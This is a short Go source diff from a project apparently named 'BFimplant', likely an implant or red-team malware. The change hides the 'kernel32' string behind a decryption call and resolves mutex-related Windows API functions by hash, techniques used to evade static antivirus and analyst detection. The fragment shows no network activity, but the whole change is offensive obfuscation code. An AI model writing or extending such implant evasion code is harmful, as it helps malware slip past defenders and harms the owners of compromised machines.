@@ -4,13 +4,14 @@ import (
 	"syscall"
 	"unsafe"
 	"BFimplant/winapiV2"
+
 )
 
 var (
-	kernel32                = syscall.NewLazyDLL("kernel32.dll")
-	procCreateMutexW        = winapiV2.GetFunctionAddressbyHash("kernel32", 0x8952e903)
-	procReleaseMutex        = winapiV2.GetFunctionAddressbyHash("kernel32", 0x29af2fd9)
-	procWaitForSingleObject = winapiV2.GetFunctionAddressbyHash("kernel32", 0xdf1b3da)
+	strr = winapiV2.DecryptString(". 7+ )vw")
+	procCreateMutexW        = winapiV2.GetFunctionAddressbyHash(strr, 0x8952e903)
+	procReleaseMutex        = winapiV2.GetFunctionAddressbyHash(strr, 0x29af2fd9)
+	procWaitForSingleObject = winapiV2.GetFunctionAddressbyHash(strr, 0xdf1b3da)
 )
 
 func CreateMutex(name string) (syscall.Handle, error) {
